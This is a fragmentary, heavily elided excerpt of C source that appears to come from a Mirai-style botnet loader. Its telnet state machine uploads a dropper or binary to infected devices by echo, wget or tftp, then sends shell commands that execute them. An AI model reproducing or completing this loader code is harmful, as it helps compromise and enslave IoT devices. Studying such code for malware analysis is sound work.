        ...
        while(TRUE)
        {
                ...
                switch(conn->state_telnet)
                {
                    ...
                    case TELNET_UPLOAD_ECHO:
                        ...
                        if(consumed)
                        {
                            ...
                            if(strncmp(conn->info.arch, "arc", 3) == 0)
                                util_sockprintf(conn->fd, "./%s telnet.scan.%s.echo; " EXEC_QUERY "\r\n", FN_DROPPER, conn->info.arch);
                            else
                                util_sockprintf(conn->fd, "./%s; ./%s telnet.scan.%s.echo; " EXEC_QUERY "\r\n", FN_DROPPER, FN_BINARY, conn->info.arch);
                    ...
                    case TELNET_UPLOAD_WGET:
                        ...
                        if(consumed > 0)
                        {
                            ...
                            #endif
                            util_sockprintf(conn->fd, "./" FN_BINARY " telnet.scan.%s.wget; " EXEC_QUERY "\r\n", conn->info.arch);
		    ...
		    case TELNET_UPLOAD_TFTP:
                        ...
                        if(consumed > 0)
                        {
			    			...
			    			#endif
                            util_sockprintf(conn->fd, "./" FN_BINARY " telnet.scan.%s.tftp; " EXEC_QUERY "\r\n", conn->info.arch);
